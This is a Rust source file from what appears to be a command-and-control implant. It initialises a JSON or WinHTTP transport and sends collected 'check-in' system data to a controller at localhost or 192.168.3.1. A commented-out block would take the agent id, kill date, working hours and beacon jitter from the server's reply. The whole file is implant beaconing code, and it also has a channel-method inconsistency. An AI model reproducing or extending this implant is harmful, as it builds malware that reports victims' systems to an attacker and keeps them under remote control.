use alloc::sync::Arc;
use core::ffi::c_void;
use libc_print::libc_eprintln;

use rs2_runtime::Runtime;

use mod_agentcore::{instance, instance_mut};

use rs2_communication_protocol::protocol::Protocol;
use rs2_communication_protocol::sender::Sender;

use rs2_crypt::encryption_algorithm::ident_algorithm::IdentEncryptor;

#[cfg(feature = "protocol-json")]
use mod_protocol_json::protocol::JsonProtocol;

#[cfg(feature = "protocol-winhttp")]
use mod_protocol_winhttp::protocol::WinHttpProtocol;

use super::system_data::checkin_from_raw;

/// Initializes the communication protocol and attempts to connect to the server.
pub fn initialize_protocol<R>(rt: Arc<R>)
where
    R: Runtime,
{
    let (tx, rx) = std::sync::mpsc::channel(); // Changed to std::sync::mpsc::channel for generic runtime compatibility

    #[cfg(feature = "protocol-json")]
    {
        let boxed_encryptor = Box::new(IdentEncryptor);
        let boxed_protocol: Box<JsonProtocol<IdentEncryptor>> =
            Box::new(JsonProtocol::new("http://localhost:80".to_string()));

        unsafe {
            instance_mut().session.encryptor_ptr = Box::into_raw(boxed_encryptor) as *mut c_void;
            instance_mut().session.protocol_ptr = Box::into_raw(boxed_protocol) as *mut c_void;
        }

        unsafe {
            let encryptor = encryptor_from_raw(instance().session.encryptor_ptr);
            let protocol = protocol_from_raw(instance().session.protocol_ptr);

            // Check if the Checkin data is available in the global instance
            if let Some(checkin_ptr) = instance().pcheckindata.as_mut() {
                // Convert the raw pointer to a mutable reference to Checkin
                let checkin_data = checkin_from_raw(checkin_ptr);

                // Set the protocol to checkin mode
                protocol.set_is_checkin(true);

                // Attempt to write the Checkin data using the protocol
                rt.block_on(async move {
                    let result = protocol
                        .write(checkin_data.clone(), Some(encryptor.clone()))
                        .await;
                    let _ = tx.send(result);
                });

                let result = rx.blocking_recv().unwrap();

                if result.is_ok() {
                    // If successful, mark the session as connected
                    instance_mut().session.connected = true;

                    // let checkin_response: Result<CheckinResponse, anyhow::Error> =
                    //     protocol.read(result.unwrap(), Some(encryptor.clone()));

                    // if checkin_response.is_ok() {
                    //     let checkin_response_data = checkin_response.unwrap();

                    //     instance_mut().config.id = checkin_response_data.id;
                    //     instance_mut().config.kill_date = checkin_response_data.kill_date;
                    //     instance_mut().config.working_hours = checkin_response_data.working_hours;
                    //     instance_mut().config.polling_interval =
                    //         checkin_response_data.polling_interval;
                    //     instance_mut().config.polling_jitter = checkin_response_data.polling_jitter;

                    //     libc_println!("Interval: {}", instance().config.polling_interval);
                    // } else {
                    //     libc_eprintln!(
                    //         "Checkin Response Error: {}",
                    //         checkin_response.err().unwrap()
                    //     );
                    // }
                } else {
                    libc_eprintln!("Error: {}", result.err().unwrap());
                }
            } else {
                // Handle error if Checkin data is null (currently commented out)
                libc_eprintln!("Error: Checkin data is null");
            }
        }
    }

    #[cfg(feature = "protocol-winhttp")]
    {
        let boxed_encryptor = Box::new(IdentEncryptor);
        let boxed_protocol: Box<WinHttpProtocol<IdentEncryptor>> =
            Box::new(WinHttpProtocol::new("http://192.168.3.1:80".to_string()));

        unsafe {
            instance_mut().session.encryptor_ptr = Box::into_raw(boxed_encryptor) as *mut c_void;
            instance_mut().session.protocol_ptr = Box::into_raw(boxed_protocol) as *mut c_void;
        }

        unsafe {
            let encryptor = encryptor_from_raw(instance().session.encryptor_ptr);
            let protocol = protocol_from_raw(instance().session.protocol_ptr);

            // Check if the Checkin data is available in the global instance
            if let Some(checkin_ptr) = instance().pcheckindata.as_mut() {
                // Convert the raw pointer to a mutable reference to Checkin
                let checkin_data = checkin_from_raw(checkin_ptr);

                // Set the protocol to checkin mode
                protocol.set_is_checkin(true);

                // Attempt to write the Checkin data using the protocol
                rt.block_on(async move {
                    let result = protocol
                        .write(checkin_data.clone(), Some(encryptor.clone()))
                        .await;
                    let _ = tx.send(result);
                });

                let result = rx.recv().unwrap();

                if result.is_ok() {
                    // If successful, mark the session as connected
                    instance_mut().session.connected = true;

                    // let checkin_response: Result<CheckinResponse, anyhow::Error> =
                    //     protocol.read(result.unwrap(), Some(encryptor.clone()));

                    // if checkin_response.is_ok() {
                    //     let checkin_response_data = checkin_response.unwrap();

                    //     instance_mut().config.id = checkin_response_data.id;
                    //     instance_mut().config.kill_date = checkin_response_data.kill_date;
                    //     instance_mut().config.working_hours = checkin_response_data.working_hours;
                    //     instance_mut().config.polling_interval =
                    //         checkin_response_data.polling_interval;
                    //     instance_mut().config.polling_jitter = checkin_response_data.polling_jitter;

                    //     libc_println!("Interval: {}", instance().config.polling_interval);
                    // } else {
                    //     libc_eprintln!(
                    //         "Checkin Response Error: {}",
                    //         checkin_response.err().unwrap()
                    //     );
                    // }
                } else {
                    libc_eprintln!("Error: {}", result.err().unwrap());
                }
            } else {
                // Handle error if Checkin data is null (currently commented out)
                libc_eprintln!("Error: Checkin data is null");
            }
        }
    }
}

#[cfg(feature = "protocol-json")]
/// Function to retrieve a mutable reference to a JsonProtocl<IdentEncryptor> struct from a raw pointer.
pub unsafe fn protocol_from_raw(ptr: *mut c_void) -> &'static mut JsonProtocol<IdentEncryptor> {
    &mut *(ptr as *mut JsonProtocol<IdentEncryptor>)
}

#[cfg(feature = "protocol-winhttp")]
/// Function to retrieve a mutable reference to a JsonProtocl<IdentEncryptor> struct from a raw pointer.
pub unsafe fn protocol_from_raw(ptr: *mut c_void) -> &'static mut WinHttpProtocol<IdentEncryptor> {
    &mut *(ptr as *mut WinHttpProtocol<IdentEncryptor>)
}

/// Function to retrieve a mutable reference to a IdentEncryptor struct from a raw pointer.
pub unsafe fn encryptor_from_raw(ptr: *mut c_void) -> &'static mut IdentEncryptor {
    &mut *(ptr as *mut IdentEncryptor)
}
